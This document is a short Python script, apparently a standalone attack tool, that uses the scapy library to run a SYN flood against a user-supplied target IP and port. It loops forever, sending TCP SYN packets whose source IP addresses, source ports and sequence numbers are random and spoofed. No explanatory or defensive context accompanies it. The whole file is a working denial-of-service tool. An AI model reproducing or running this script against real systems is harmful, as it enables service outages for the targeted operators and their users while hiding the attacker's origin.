# coding=utf-8
from scapy.all import *
import random

def get_random_ip():
    src = "%i.%i.%i.%i" % (random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
    return src

def get_random_port():
    sport=random.randint(1, 65535)
    return sport

def get_random_int():
    randomint=random.randint(1000,9000)
    return randomint
    
target_ip = input("SYN Flood Target IP：")
target_port = int(input("SYN Flood Target PORT："))
print("syn flooding...")
while 1:
    IP_pkg = IP(src = get_random_ip(),dst = target_ip)
    TCP_pkg = TCP(sport = get_random_port(),dport = target_port,flags = 'S',seq = get_random_int())
    send(IP_pkg/TCP_pkg,verbose=0)
